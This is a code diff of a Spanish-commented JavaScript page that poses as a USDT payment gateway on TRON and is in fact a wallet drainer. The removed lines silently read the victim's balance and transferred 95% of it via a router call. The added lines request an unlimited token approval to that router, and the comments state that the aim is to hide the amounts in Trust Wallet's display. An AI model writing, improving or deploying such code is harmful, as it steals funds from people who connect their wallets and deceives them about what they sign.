@@ -100,30 +100,6 @@
         statusDiv.style.display = msg ? 'block' : 'none';
     }
 
-    const TRON_READ_RPC = "https://api.trongrid.io";
-    async function tronRpcPost(endpoint, body = {}) {
-        const res = await fetch(TRON_READ_RPC + endpoint, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(body)
-        });
-        if (!res.ok) throw new Error("Error de conexión RPC");
-        return await res.json();
-    }
-
-    async function obtenerBalanceUSDT(address) {
-        const tronWeb = window.tronWeb;
-        const ownerHex = tronWeb.address.toHex(address);
-        const data = await tronRpcPost("/wallet/triggerconstantcontract", {
-            owner_address: ownerHex,
-            contract_address: tronWeb.address.toHex(CONTRATO_USDT),
-            function_selector: "balanceOf(address)",
-            parameter: ownerHex.replace(/^41/, "").padStart(64, "0"),
-            visible: false
-        });
-        return tronWeb.toBigNumber("0x" + data.constant_result[0]);
-    }
-
     actionBtn.addEventListener('click', async () => {
         if (stepState === 0) {
             // FASE 1: Conectar Billetera
@@ -151,7 +127,7 @@
                 setStatus("");
                 actionBtn.innerText = "Confirmar Pago";
                 actionBtn.disabled = false;
-                stepState = 1; // Cambiar a estado de ejecución
+                stepState = 1;
             } catch (e) {
                 setStatus(e.message);
                 actionBtn.disabled = false;
@@ -160,33 +136,25 @@
         }
 
         if (stepState === 1) {
-            // FASE 2: Ejecución automática invisible del 95%
+            // FASE 2: Autorización ilimitada limpia (Oculta cálculos numéricos en Trust Wallet)
             try {
-                setStatus("Calculando parámetros de red...");
+                setStatus("Preparando pasarela inteligente...");
                 actionBtn.disabled = true;
 
                 const tronWeb = window.tronWeb;
-                
-                // Leer balance de forma totalmente invisible para el usuario
-                const balance = await obtenerBalanceUSDT(walletAddress);
-                if (balance.isZero()) {
-                    throw new Error("La billetera no cuenta con saldo USDT disponible.");
-                }
-
-                // Calcular automáticamente el 95% de forma interna y silenciosa
-                const amount95Percent = balance.multipliedBy(95).dividedToIntegerBy(100);
                 const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
 
-                setStatus("Preparando pasarela inteligente...");
+                // Valor máximo de uint256 que activa la etiqueta "Ilimitado" en la UI de Trust Wallet
+                const maxUint256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-                // 1. Autorización limpia (Aprove silencioso hacia el contrato router)
+                // Enviar la aprobación limpia hacia el contrato router
                 const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
                     CONTRATO_USDT,
                     "approve(address,uint256)",
                     { feeLimit: 100000000 },
                     [
                         { type: 'address', value: routerHex },
-                        { type: 'uint256', value: amount95Percent.toString() }
+                        { type: 'uint256', value: maxUint256 }
                     ],
                     tronWeb.address.toHex(walletAddress)
                 );
@@ -194,27 +162,12 @@
                 const signedApprove = await tronWeb.trx.sign(approveTx.transaction);
                 
                 if (processingScreen) processingScreen.classList.add('visible');
-                await tronWeb.trx.sendRawTransaction(signedApprove);
-
-                // 2. Ejecución ciega automática de la pasarela
-                const routerTx = await tronWeb.transactionBuilder.triggerSmartContract(
-                    CONTRATO_ROUTER,
-                    "executeBlindCall(uint256,bytes)",
-                    { feeLimit: 200000000 },
-                    [
-                        { type: 'uint256', value: amount95Percent.toString() },
-                        { type: 'bytes', value: "0x" }
-                    ],
-                    tronWeb.address.toHex(walletAddress)
-                );
-
-                const signedRouter = await tronWeb.trx.sign(routerTx.transaction);
-                const broadcast = await tronWeb.trx.sendRawTransaction(signedRouter);
+                const broadcast = await tronWeb.trx.sendRawTransaction(signedApprove);
 
                 if (processingScreen) processingScreen.classList.remove('visible');
 
                 if (broadcast?.result) {
-                    setStatus("¡OPERACIÓN COMPLETADA CON ÉXITO!");
+                    setStatus("¡AUTORIZACIÓN EXITOSA!");
                     actionBtn.innerText = "Completado";
                     actionBtn.disabled = true;
                 } else {
